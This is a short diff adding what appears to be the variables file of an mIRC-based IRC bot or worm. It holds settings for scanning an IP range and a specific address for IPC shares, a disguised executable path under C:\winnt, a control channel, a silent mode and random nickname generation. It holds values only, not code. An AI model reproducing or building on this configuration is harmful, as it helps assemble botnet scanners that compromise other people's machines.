@@ -1,0 +1,16 @@
+[variables]
+n0=%userlenght 6
+n1=%nicklenght 4
+n2=%ipcscan 61.x.x.x
+n3=%ipcscannow 61.226.95.106
+n4=%test 500 Syntax error or unknown command
+n5=%vitesse 150
+n6=%servernum 1
+n7=%nick ^Fr33z3D^
+n8=%i 1
+n9=%x C:\winnt\windebug.exe
+n10=%amsg #xtremmshell
+n11=%r
+n12=%dwlstarttime 1060912770
+n13=%silence on
+n14=%genrenick 5
